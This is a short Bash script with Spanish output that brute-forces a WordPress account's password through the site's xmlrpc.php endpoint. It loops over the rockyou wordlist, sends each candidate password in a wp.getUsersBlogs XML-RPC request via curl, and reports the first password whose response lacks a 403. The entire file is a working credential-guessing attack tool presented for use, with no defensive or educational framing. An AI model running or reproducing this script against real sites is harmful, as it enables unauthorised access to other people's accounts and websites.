#!/bin/bash
wordlist="/usr/share/wordlists/rockyou.txt"

if [ ! -f "$wordlist" ]; then
    echo "$wordlist No existe."

fi

if [ -z "$1" ]; then
    echo "Usuario no seleccionado."
    echo "./aaa.sh USER DOMAIN"
elif [ -z "$2" ]; then
    echo "Dominio no seleccionado."
    echo "./aaa.sh USER DOMAIN"
else


    cat $wordlist | while read LINE; do
        rm /tmp/curl.tmp /tmp/enviar.xml
        cat <<< "
                    <?xml version="1.0" encoding="UTF-8"?>
                        <methodCall> 
                            <methodName>wp.getUsersBlogs</methodName> 
                                <params> 
                                    <param><value>$1</value></param> 
                                    <param><value>$LINE</value></param> 
                                </params>     
                        </methodCall>
        " > /tmp/enviar.xml

        echo -e "[+] Probamos con la contraseña $LINE"


        curl -s -X POST http://$2/xmlrpc.php -d@/tmp/enviar.xml -o /tmp/curl.tmp


        if [ ! "$(cat /tmp/curl.tmp | grep '403')" ]; then
            echo -e "[+] La contraseña para $1 es $LINE"
            exit 0
        fi

    done
fi
